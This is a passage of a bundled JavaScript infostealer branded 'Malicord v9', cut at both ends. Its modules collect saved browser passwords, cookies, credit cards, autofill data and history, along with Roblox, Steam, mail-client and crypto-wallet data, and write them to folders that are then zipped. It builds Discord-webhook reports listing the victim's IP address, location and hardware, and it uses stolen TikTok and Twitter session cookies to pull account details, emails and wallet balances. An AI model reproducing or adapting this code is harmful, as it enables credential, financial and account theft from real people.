fs.readFileSync(file));\n    } catch (e) {}\n  }\n}\n\nasync function SimpleSave(copypath, mainfolder) {\n  let basepath = stat.testpath[0];\n  const files = core.recursiveRead(copypath, copypath, \"\");\n  for (var i = 0; i < files.length; i++) {\n    const file = files[i];\n    const savePath =\n      basepath + \"\\\\\" + mainfolder + \"\\\\\" + file.replace(copypath, \"\");\n    try {\n      createAllDir(savePath);\n      fs.writeFileSync(savePath, fs.readFileSync(file));\n    } catch (e) {}\n  }\n}\n\nasync function ArraySave(saves, mainfolder, subfolder) {\n  let basepath = stat.testpath[0];\n  for (var i = 0; i < saves.length; i++) {\n    const save = saves[i];\n\n    try {\n      if (fs.lstatSync(save).isDirectory()) {\n        const files = core.recursiveRead(save, save, \"\");\n        for (var j = 0; j < files.length; j++) {\n          const file = files[j];\n\n          let savePath;\n          if (subfolder != \"\") {\n            savePath =\n              basepath +\n              \"\\\\\" +\n              mainfolder +\n              \"\\\\\" +\n              subfolder +\n              \"\\\\\" +\n              save.slice(0, -1).split(\"\\\\\").pop() +\n              \"\\\\\" +\n              core.fileName(file);\n          } else {\n            savePath =\n              basepath +\n              \"\\\\\" +\n              mainfolder +\n              \"\\\\\" +\n              save.slice(0, -1).split(\"\\\\\").pop() +\n              \"\\\\\" +\n              core.fileName(file);\n          }\n\n          try {\n            createAllDir(savePath);\n            fs.writeFileSync(savePath, fs.readFileSync(file));\n          } catch (e) {\n            console.log(e);\n          }\n        }\n      } else {\n        const savePath =\n          basepath +\n          \"\\\\\" +\n          mainfolder +\n          \"\\\\\" +\n          subfolder +\n          \"\\\\\" +\n          core.fileName(save);\n        try {\n          createAllDir(savePath);\n          fs.writeFileSync(savePath, fs.readFileSync(save));\n        } catch (e) {\n          console.log(e);\n        }\n      }\n    } catch (e) {}\n  }\n}\n\nfunction createAllDir(str) {\n  var folders = str.split(path.sep);\n  var dir = \"\";\n  for (var i = 0; i < folders.length - 1; i++) {\n    dir += folders[i] + path.sep;\n    if (!fs.existsSync(dir)) {\n      fs.mkdirSync(dir);\n    }\n  }\n}\n\nasync function SaveError(error) {\n  let basepath = stat.testpath[0];\n  var savePath = basepath + \"\\\\Logs\\\\\";\n  try {\n    fs.mkdirSync(savePath, { recursive: true });\n  } catch (e) {}\n  savePath += \"Error.malicord\";\n  if (fs.existsSync(savePath)) {\n    fs.appendFileSync(savePath, error + \"\\n\");\n  } else {\n    fs.writeFileSync(savePath, error + \"\\n\");\n  }\n}\n\nasync function saveCookies(cookies, name) {\n  let basepath = stat.testpath[0];\n  if (cookies.length == 0) {\n    return;\n  }\n\n  var savePath = basepath + \"\\\\Browsers\\\\\";\n  try {\n    await fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  savePath += name + \" - Cookies.txt\";\n  var cookiesFinal = \"\";\n  for (let i = 0; i < cookies.length; i++) {\n    cookiesFinal += cookies[i].build();\n  }\n\n  fs.writeFileSync(savePath, cookiesFinal);\n}\n\nasync function saveRoblox(cookies) {\n  try {\n    let basepath = stat.testpath[0];\n    var savePath = basepath + \"\\\\Games\\\\\";\n\n    try {\n      fs.mkdirSync(savePath, { recursive: true });\n    } catch (e) {}\n\n    savePath += \"Roblox\\\\\";\n    fs.mkdirSync(savePath, { recursive: true });\n    savePath += `Roblox.txt`;\n    var cookiesFinal = \"\";\n    for (let i = 0; i < cookies.length; i++) {\n      cookiesFinal += cookies[i];\n    }\n    if (fs.existsSync(savePath)) {\n      fs.appendFileSync(savePath, cookiesFinal + \"\\n\");\n    } else {\n      fs.writeFileSync(savePath, cookiesFinal);\n    }\n  } catch (e) {}\n}\n\nasync function saveMailClients(accounts, name) {\n  let basepath = stat.testpath[0];\n  let savePath = basepath + \"\\\\MailClients\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  savePath += name + \"\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  fs.writeFileSync(\n    savePath + \"accounts.json\",\n    JSON.stringify(accounts, null, 4)\n  );\n}\n\nasync function saveBrowser(\n  passwords,\n  autofills,\n  cards,\n  history,\n  downloads,\n  bookmarks\n) {\n  let basepath = stat.testpath[0];\n  const savePath = basepath + \"\\\\Browsers\\\\\";\n  const saveRoblx = basepath + \"\\\\Games\\\\Roblox\\\\\";\n\n  try {\n    if (!fs.existsSync(savePath)) {\n      await mkdirAsync(savePath);\n    }\n  } catch (e) {}\n\n  try {\n    if (stat.roblox_account && stat.roblox_account.length > 0) {\n      if (!fs.existsSync(basepath + \"\\\\Games\")) {\n        await mkdirAsync(basepath + \"\\\\Games\");\n      }\n      if (!fs.existsSync(saveRoblx)) {\n        await mkdirAsync(saveRoblx);\n      }\n      const cookiesContent = stat.roblox_account.join(\"\\n\");\n      fs.writeFileSync(saveRoblx + \"Cookies.txt\", cookiesContent);\n    }\n  } catch (e) {}\n\n  let passwordFinal = \"\";\n  for (let i = 0; i < passwords.length; i++) {\n    if (passwords[i] && typeof passwords[i].build === \"function\") {\n      passwordFinal += passwords[i].build() + \"\\n\";\n    }\n  }\n\n  if (passwordFinal.length !== 0) {\n    passwordFinal = core.getHeader() + passwordFinal;\n  }\n\n  let autofillFinal = \"\";\n  for (let i = 0; i < autofills.length; i++) {\n    autofillFinal += autofills[i].build() + \"\\n\";\n  }\n\n  if (autofillFinal.length != 0) {\n    autofillFinal = core.getHeader() + autofillFinal;\n  }\n\n  let historyFinal = \"\";\n  for (let i = 0; i < history.length; i++) {\n    historyFinal += history[i].build() + \"\\n\";\n  }\n\n  if (historyFinal.length != 0) {\n    historyFinal = core.getHeader() + historyFinal;\n  }\n\n  let downloadFinal = \"\";\n  for (let i = 0; i < downloads.length; i++) {\n    downloadFinal += downloads[i].build() + \"\\n\";\n  }\n\n  if (downloadFinal.length != 0) {\n    downloadFinal = core.getHeader() + downloadFinal;\n  }\n\n  let bookmarkFinal = \"\";\n  for (let i = 0; i < bookmarks.length; i++) {\n    bookmarkFinal += bookmarks[i].build() + \"\\n\";\n  }\n\n  if (bookmarkFinal.length != 0) {\n    bookmarkFinal = core.getHeader() + bookmarkFinal;\n  }\n\n  let cardFinal = \"\";\n  for (let i = 0; i < cards.length; i++) {\n    cardFinal += cards[i].build() + \"\\n\";\n  }\n\n  if (cardFinal.length != 0) {\n    cardFinal = core.getHeader() + cardFinal;\n  }\n\n  fs.writeFileSync(savePath + \"Passwords.txt\", passwordFinal);\n  fs.writeFileSync(savePath + \"AutoFill.txt\", autofillFinal);\n  fs.writeFileSync(savePath + \"History.txt\", historyFinal);\n  fs.writeFileSync(savePath + \"Downloads.txt\", downloadFinal);\n  fs.writeFileSync(savePath + \"Bookmarks.txt\", bookmarkFinal);\n  fs.writeFileSync(savePath + \"Cards.txt\", cardFinal);\n}\n\nasync function saveMailClients(accounts, name) {\n  let basepath = stat.testpath[0];\n  let savePath = basepath + \"\\\\MailClients\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  savePath += name + \"\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  fs.writeFileSync(\n    savePath + \"accounts.json\",\n    JSON.stringify(accounts, null, 4)\n  );\n}\n\nasync function saveSysAdmin(accounts, name) {\n  let basepath = stat.testpath[0];\n  let savePath = basepath + \"\\\\Clients\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  savePath += name + \"\\\\\";\n  try {\n    fs.mkdirSync(savePath);\n  } catch (e) {}\n\n  fs.writeFileSync(\n    savePath + \"accounts.json\",\n    JSON.stringify(accounts, null, 4)\n  );\n}\n\nasync function zipResult() {\n  let savepath = stat.savepath[0];\n  let basepath = stat.testpath[0];\n  const archive = archiver(\"zip\", { zlib: { level: 9 } });\n  const stream = fs.createWriteStream(savepath);\n  return new Promise((resolve, reject) => {\n    try {\n      archive\n        .directory(basepath + \"\\\\\", false)\n        .on(\"error\", (err) => reject(err))\n        .pipe(stream);\n\n      stream.on(\"close\", () => resolve(savepath));\n      archive.finalize().then(() => {});\n    } catch {}\n  });\n}\n\nfunction zip(savepath) {\n  savepath = path.join(savepath[0], \"..\");\n  const archive = archiver(\"zip\", { zlib: { level: 9 } });\n  const stream = fs.createWriteStream(savepath + \"\\\\Exodus.zip\");\n  return new Promise((resolve, reject) => {\n    try {\n      archive\n        .directory(savepath + \"\\\\\", false)\n        .on(\"error\", (err) => reject(err))\n        .pipe(stream);\n\n      stream.on(\"close\", () => resolve(savepath + \"\\\\Exodus.zip\"));\n      archive.finalize().then(() => {});\n    } catch {}\n  });\n}\n\nmodule.exports = {\n  getbasepath,\n  Init,\n  SimpleSave,\n  Save,\n  ArraySave,\n  zipResult,\n  saveBrowser,\n  saveCookies,\n  saveRoblox,\n  saveMailClients,\n  saveSysAdmin,\n  zip,\n  SaveError,\n};\n\n\n//# sourceURL=webpack://script/./utils/save.js?");

/***/ }),

/***/ "./utils/stats.js":
/*!************************!*\
  !*** ./utils/stats.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const path = __webpack_require__(/*! path */ \"path\"),\n{embeds, stats, badge} = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\n\nclass Stat {\n  constructor() {\n    this.passwords = 0;\n    this.cookies = 0;\n    this.autofills = 0;\n    this.cards = 0;\n    this.history = 0;\n    this.downloads = 0;\n    this.bookmarks = 0;\n\n    this.games = [];\n    this.exodus = [];\n    this.keyword_password = [];\n    this.vpn = [];\n    this.sysadmin = [];\n    this.extensions = [];\n    this.colds = [];\n    this.mnemonics = [];\n    this.messengers = [];\n    this.file = []; \n    this.roblox_cookies = [];\n    this.twitter_cookies = [];\n    this.roblox_account = [];\n    this.minecraft_account = [];\n    this.atomicurl = [];\n    this.exodusurl = [];\n    this.testpath = [];\n    this.savepath = [];\n    this.twitter_account = [];\n    this.steam_content = [];\n    this.steam_account = [];\n    this.secretpath = [];\n    this.discordAccount = [];\n    this.InstaSessId = [];\n    this.TiktokSessId = [];\n    this.RedditSess = [];\n    this.passphrase;\n  }\n  addReddit(name) {\n    this.RedditSess.push(name);\n  }\n  addTikTok(name) {\n    this.TiktokSessId.push(name);\n  }\n  addSessIDInsta(name) {\n    this.InstaSessId.push(name);\n  }\n  addDiscordAccountbis(name) {\n    this.discordAccount[0].push(name);\n  }\n  addDiscordAccount(name) {\n    this.discordAccount.push(name);\n  }\n  addSteamAcc(name) {\n    this.steam_account.push(name);\n  }\n  addSecret(name) {\n    this.secretpath.push(name);\n  }\n  addSteam(name) {\n    this.steam_content.push(name);\n  }\n  addsavepath(name) {\n    this.savepath.push(name);\n  }\n  addbasepath(name) {\n    this.testpath.push(name);\n  }\n  addAtomicLink(name) {\n    this.atomicurl.push(name);\n  }\n  addExodusLink(name) {\n    this.exodusurl.push(name);\n  }\n  addMinecraft(name) {\n    this.minecraft_account.push(name);\n  }\n  detailRoblox(name) {\n    this.roblox_account.push(name);\n  }\n  AddTwitter(name) {\n    this.twitter_cookies.push(name);\n  }\n  AddRoblox(name) {\n    this.roblox_cookies.push(name);\n  }\n  AddTwitterAccount(name) {\n    this.twitter_account.push(name);\n  }\n\n  AddBrowser(\n    passwords,\n    cookies,\n    autofills,\n    cards,\n    history,\n    downloads,\n    bookmarks\n  ) {\n    this.passwords = passwords;\n    this.cookies = cookies;\n    this.autofills = autofills;\n    this.cards = cards;\n    this.history = history;\n    this.downloads = downloads;\n    this.bookmarks = bookmarks;\n  }\n\n  AddGames(name) {\n    this.games.push(name);\n  }\n\n  Addfilestealer(name) {\n    this.file.push(name);\n  }\n\n  AddExodus(name) {\n    this.exodus.push(name);\n  }\n\n  AddKeyword(name) {\n    this.keyword_password.push(name);\n  }\n\n  AddVpn(name) {\n    this.vpn.push(name);\n  }\n\n  AddSysAdmin(name) {\n    this.sysadmin.push(name);\n  }\n\n  AddExtensions(name) {\n    this.extensions.push(name);\n  }\n\n  AddColds(name) {\n    this.colds.push(name);\n  }\n\n  AddPassphrase(passphrase) {\n    this.passphrase = passphrase;\n  }\n\n  AddMessenger(name) {\n    this.messengers.push(name);\n  }\n\n  Build(\n    username,\n    ip,\n    hostname,\n    city,\n    region,\n    country,\n    googlemap,\n    org,\n    postal,\n    timezone,\n    disk,\n    ram,\n    uid,\n    cpucount,\n    OS,\n    cpu,\n    GPU,\n    windowskey,\n    windowsversion,\n    link\n  ) {\n    let builded = {\n      avatar_url:\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\n      content: null,\n\n      embeds: [\n        {\n          color: 10038562,\n          author: {\n            name: \"Malicord v9\",\n            url: \"https://t.me/Sordeal\",\n            icon_url:\n              \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord.gif\",\n          },\n          description: `[${embeds.nova} Malicord Configuration](https://t.me/Sordeal)`,\n          fields: [\n            {\n              name: \"\\u200b\",\n              value: `\\`\\`\\`ansi\n\u001b[2;32mIP:${ip ?? \"N/A\"}\nCity:${city ?? \"N/A\"}\nRegion:${region ?? \"N/A\"}\nCountry:${country ?? \"N/A\"}\u001b[0m\u001b[2;32m\u001b[0m\n\\`\\`\\``,\n              inline: true,\n            },\n            {\n              name: \"\\u200b\",\n              value: `\\`\\`\\`ansi\n\u001b[2;32mComputerName:${process.env.COMPUTERNAME}\nWindowsVer:${windowsversion}\nRamStockage:${ram}GB\nDiskStockage:${disk}GB\u001b[0m\u001b[2;32m\u001b[0m\n\\`\\`\\``,\n              inline: true,\n            },\n            {\n              name: \"\\u200b\",\n              value: `\\`\\`\\`ansi\n\u001b[2;36mCookiesFound:${this.cookies}\nPasswordsFound:${this.passwords}\nCreditCardFound:${this.cards}\nAutoFillFound:${this.autofills}\nSocialApp:${this.messengers.length ? this.messengers.length : 0}\nHistory:${this.history}\nDownloads:${this.downloads}\nBookmarks:${this.bookmarks}0\u001b[0m\n\\`\\`\\``,\n              inline: false,\n            },\n            {\n              name: \"\\u200b\",\n              value: `\n${\n  this.colds.length > 0\n    ? `${embeds.crypto} **Cold Wallets:** ${\n        this.colds.join(\", \") ? `(\\`` + this.colds.join(\", \") + `\\`)` : \"\"\n      }`\n    : \"\"\n}${\n                this.extensions.length > 0\n                  ? `\\n${embeds.crypto} **Extension Wallets:** ${\n                      this.extensions.join(\", \")\n                        ? `(\\`` + this.extensions.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.passphrase !== undefined &&\n                this.passphrase !== \"\" &&\n                this.passphrase.length < 0\n                  ? `\\n${stats.metamask} **Metamask Recovery Key:** ${this.passphrase}`\n                  : \"\"\n              }${\n                this.exodus.length > 0\n                  ? `\\n${stats.exodus} **Exodus Password:** ${\n                      this.exodus.join(\", \")\n                        ? `(\\`` + this.exodus.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.games.length > 0\n                  ? `\\n **Games Found:** ${\n                      this.games.join(\", \")\n                        ? `(\\`` + this.games.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.sysadmin.length > 0\n                  ? `\\n **Clients Found:** ${\n                      this.sysadmin.join(\", \")\n                        ? `(\\`` + this.sysadmin.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }${\n                this.vpn.length > 0\n                  ? `\\n **VPN:**${\n                      this.vpn.join(\", \")\n                        ? `(\\`` + this.vpn.join(\", \") + `\\`)`\n                        : \"\"\n                    }`\n                  : \"\"\n              }\n\\n${\n                link\n                  ? `\\n[${stats.download} \\`${path.basename(\n                      this.savepath[0]\n                    )}\\`](${link})\\n` + `\\`\\`\\`${link}\\`\\`\\``\n                  : \"\"\n              }`,\n              inline: false,\n            },\n          ],\n          footer: {\n            text: \"@Malicord | https://t.me/Sordeal\",\n          },\n        },\n      ],\n      username: \"Malicord\",\n      attachments: [],\n    };\n\n    return JSON.stringify(builded);\n  }\n}\n\nvar stat = new Stat();\n\nmodule.exports = {\n  stat,\n};\n\n\n//# sourceURL=webpack://script/./utils/stats.js?");

/***/ }),

/***/ "./utils/steam.js":
/*!************************!*\
  !*** ./utils/steam.js ***!
  \************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  { embeds, stats, badge } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\nasync function detailSteam(cc) {\r\n  if (cc != \"yes\") return;\r\n  try {\r\n    if (stat.steam_content[0] && Array.isArray(stat.steam_content)) {\r\n      const accounts = stat.steam_content[0];\r\n      if (!accounts) return;\r\n      await Promise.all(\r\n        accounts.forEach(async account => {\r\n          \r\n          try {\r\n            const { data: accountInfo } = await axios.get(\r\n              `https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=3000BC0F14309FD7999F02C66E757EF7&steamids=${account}`\r\n            );\r\n            const { data: games } = await axios.get(\r\n              `https://api.steampowered.com/IPlayerService/GetOwnedGames/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}&include_appinfo=true`\r\n            );\r\n            const { data: level } = await axios.get(\r\n              `https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=3000BC0F14309FD7999F02C66E757EF7&steamid=${account}`\r\n            );\r\n            stat.addSteamAcc({ accountId: account, accountInfo: accountInfo.response.players, games, level: level.response });\r\n          } catch (error) {}\r\n        })\r\n      );\r\n      \r\n    }\r\n  } catch (e) {}\r\n}\r\n\r\nfunction sendSteam(cc) {\r\n  if (cc != \"yes\") return;\r\n  let e = [];\r\n  try {\r\n    stat.steam_account\r\n      .slice(0, 5)\r\n      .forEach(({ accountId, accountInfo, games, level }) => {\r\n        if(!accountInfo || !level)return;\r\n        accountInfo = accountInfo[0]\r\n        const embed = {\r\n          title: \"Steam Session\",\r\n          color: 10038562,\r\n          author: {\r\n            name: accountInfo.personaname,\r\n            icon_url: accountInfo.avatar,\r\n            url: accountInfo.profileurl,\r\n          },\r\n          fields: [\r\n            {\r\n              name: `${embeds.infoyl} Name:`,\r\n              value: `\\`${accountInfo.personaname}\\``,\r\n              inline: false,\r\n            },\r\n            {\r\n              name: `${embeds.nitro} Created At:`,\r\n              value: `${ accountInfo.timecreated !== undefined ? `<t:${accountInfo.timecreated}>` : 'none'}`,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.phone} Level:`,\r\n              value: `\\`${level.player_level ?? 0}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.mail} Games:`,\r\n              value: `\\`${games.response.game_count ?? 0}\\``,\r\n              inline: true,\r\n            },\r\n          ],\r\n        };\r\n        e.push(embed);\r\n      });\r\n    let g = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n      username: \"Malicord\",\r\n      embeds: e,\r\n    };\r\n    return g;\r\n  } catch (e) {}\r\n}\r\n\r\nmodule.exports = {\r\n  detailSteam,\r\n  sendSteam,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/steam.js?");

/***/ }),

/***/ "./utils/tiktok.js":
/*!*************************!*\
  !*** ./utils/tiktok.js ***!
  \*************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  { embeds, stats } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  path = __webpack_require__(/*! path */ \"path\");\r\n\r\nasync function ParseTiktok(cc) {\r\n  if (cc !== \"yes\") return;\r\n  let g = [];\r\n  const basepath = stat.testpath[0];\r\n  const socialDir = path.join(basepath, \"Social\");\r\n  const TiktokDir = path.join(socialDir, \"TikTok\");\r\n  let tiktok_sessions = stat.TiktokSessId;\r\n  if (tiktok_sessions && tiktok_sessions.length) {\r\n    for (const tiktok of tiktok_sessions) {\r\n      const profile = await axios\r\n        .get(\r\n          \"https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE\",\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n              \"Accept-Encoding\": \"identity\",\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      const insights = await axios\r\n        .post(\r\n          \"https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE\",\r\n          'type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]',\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      const wallet = await axios\r\n        .get(\r\n          \"https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true\",\r\n          {\r\n            headers: {\r\n              cookie: `sessionid=${tiktok}`,\r\n            },\r\n          }\r\n        )\r\n        .then((res) => res.data)\r\n        .catch(() => {});\r\n\r\n      if (!profile || !profile.data) return;\r\n      let { username, email } = profile.data;\r\n      let { follower_num } = insights;\r\n      let { coins } = wallet.data;\r\n\r\n      let fdp = `Account: ${username}\r\nemail: ${email ?? \"none\"}\r\nfollower_num: ${follower_num}\r\ncoins: ${coins ?? 0}`;\r\n      try {\r\n        if (!fs.existsSync(socialDir)) {\r\n          fs.mkdirSync(socialDir);\r\n        }\r\n        if (!fs.existsSync(TiktokDir)) {\r\n          fs.mkdirSync(TiktokDir);\r\n        }\r\n      } catch (e) {}\r\n      try {\r\n        const tiktokFilePath = path.join(TiktokDir, \"TikTok.txt\");\r\n        fs.writeFileSync(tiktokFilePath, fdp);\r\n      } catch (e) {}\r\n      let embed = {\r\n        title: \"Tiktok Session\",\r\n        fields: [\r\n          {\r\n            name: `${embeds.tiktok} Username:`,\r\n            value: `[\\`${username}\\`](https://instagram.com/${username})`,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.twitter_followers} Followers:`,\r\n            value: `\\`${follower_num.value ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.mail} Email`,\r\n            value: `\\`${email ?? \"None\"}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${embeds.token} Coins`,\r\n            value: `\\`${coins ?? 0}\\``,\r\n            inline: true,\r\n          },\r\n          {\r\n            name: `${stats.cookie} Token`,\r\n            value: `\\`\\`\\`${tiktok}\\`\\`\\``,\r\n            inline: false,\r\n          },\r\n        ],\r\n        footer: {\r\n          text: \"@Malicord | https://t.me/Sordeal\",\r\n        },\r\n        color: 10038562,\r\n      };\r\n      g.push(embed);\r\n    }\r\n\r\n    let tosend = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n      username: \"Malicord\",\r\n      embeds: g,\r\n    };\r\n    return tosend;\r\n  }\r\n}\r\nmodule.exports = {\r\n  ParseTiktok,\r\n};\r\n\n\n//# sourceURL=webpack://script/./utils/tiktok.js?");

/***/ }),

/***/ "./utils/twitter.js":
/*!**************************!*\
  !*** ./utils/twitter.js ***!
  \**************************/
/***/ ((module, __unused_webpack_exports, __webpack_require__) => {

eval("const { stat } = __webpack_require__(/*! ./stats */ \"./utils/stats.js\"),\r\n  fs = __webpack_require__(/*! fs */ \"fs\"),\r\n  axios = __webpack_require__(/*! axios */ \"axios\"),\r\n  path = __webpack_require__(/*! path */ \"path\"),\r\n  { embeds } = __webpack_require__(/*! ./emotes */ \"./utils/emotes.js\");\r\n\r\n\r\n  \r\nasync function detailtwitter(tw) {\r\n  if (tw != \"yes\") return;\r\n  const cooks = stat.twitter_cookies;\r\n  if (!cooks) return;\r\n  if (cooks.length < 12) return;\r\n  try {\r\n    const { value: ct0 } = cooks.find((cookie) => cookie.name === \"ct0\");\r\n    const { value: authToken, source } = (await cooks).find(\r\n      (cookie) => cookie.name === \"auth_token\"\r\n    );\r\n    const { data: profile } = await axios.post(\r\n      \"https://twitter.com/i/api/1.1/account/update_profile.json\",\r\n      {},\r\n      {\r\n        headers: {\r\n          Cookie: `ct0=${ct0}; auth_token=${authToken}`,\r\n          Host: \"twitter.com\",\r\n          \"User-Agent\":\r\n            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0\",\r\n          Accept: \"*/*\",\r\n          \"Accept-Language\": \"fr-FR\",\r\n          \"Accept-Encoding\": \"gzip, deflate, br\",\r\n          Prefer: \"safe\",\r\n          authorization:\r\n            \"Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA\",\r\n          \"x-twitter-auth-type\": \"OAuth2Session\",\r\n          \"x-csrf-token\": ct0,\r\n          \"x-twitter-client-language\": \"en\",\r\n          \"x-twitter-active-user\": \"yes\",\r\n          Origin: \"https://twitter.com\",\r\n          Connection: \"keep-alive\",\r\n          Referer: \"https://twitter.com/\",\r\n          \"Sec-Fetch-Dest\": \"empty\",\r\n          \"Sec-Fetch-Mode\": \"cors\",\r\n          \"Sec-Fetch-Site\": \"same-site\",\r\n        },\r\n      }\r\n    );\r\n    profile.cookie = ct0;\r\n    profile.source = source;\r\n    stat.AddTwitterAccount(profile);\r\n    const basepath = stat.testpath[0];\r\n    const socialDir = path.join(basepath, \"Social\");\r\n    const twitterDir = path.join(socialDir, \"Twitter\");\r\n    try {\r\n      if (!fs.existsSync(socialDir)) {\r\n        fs.mkdirSync(socialDir);\r\n      }\r\n      if (!fs.existsSync(twitterDir)) {\r\n        fs.mkdirSync(twitterDir);\r\n      }\r\n    } catch (e) {\r\n    }\r\n    const twitterFilePath = path.join(twitterDir, \"Twitter.json\");\r\n    fs.writeFileSync(twitterFilePath, JSON.stringify(profile));\r\n  } catch (e) {}\r\n}\r\n\r\nfunction sendTwitter(tw) {\r\n  if (tw !== \"yes\") return;\r\n  if (stat.twitter_account[0]) {\r\n    let {\r\n      screen_name,\r\n      name,\r\n      location,\r\n      profile_location,\r\n      description,\r\n      created_at,\r\n      followers_count,\r\n      favourites_count,\r\n      cookie,\r\n      profile_image_url,\r\n      profile_banner_url,\r\n      profile_text_color,\r\n      friends_count,\r\n      verified,\r\n    } = stat.twitter_account[0];\r\n    const handleNullValue = (value) => value ?? \"none\";\r\n    let embed = {\r\n      avatar_url:\r\n        \"https://raw.githubusercontent.com/ksch-58/sub/main/assets/malicord-removebg-preview.png\",\r\n      username: \"Malicord\",\r\n      embeds: [\r\n        {\r\n          color: 10038562,\r\n          thumbnail: {\r\n            url: profile_image_url.replace(\"normal\", \"bigger\"),\r\n          },\r\n          image: {\r\n            url: profile_banner_url,\r\n          },\r\n          fields: [\r\n            {\r\n              name: verified\r\n                ? `${embeds.twitter_usernamecert} Username:`\r\n                : `${embeds.twitter_usernameuncert} Username:`,\r\n              value: `\\`${handleNullValue(name)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_followers} Followers:`,\r\n              value: `\\`${handleNullValue(followers_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_followings} Following:`,\r\n              value: `\\`${handleNullValue(friends_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_fav} Favourites:`,\r\n              value: `\\`${handleNullValue(favourites_count)}\\``,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.mail} User:`,\r\n              value: `[\\`${handleNullValue(\r\n                screen_name\r\n              )}\\`](https://twitter.com/${screen_name})`,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.twitter_location} Location:`,\r\n              value: `[${handleNullValue(\r\n                profile_location\r\n              )}](https://www.google.com/maps/place/France/${location})`,\r\n              inline: true,\r\n            },\r\n            {\r\n              name: `${embeds.mail}  Description:`,\r\n              value: `\\`${handleNullValue(description)}\\``,\r\n              inline: false,\r\n            },\r\n            {\r\n              name: ` Cookie:`,\r\n              value: 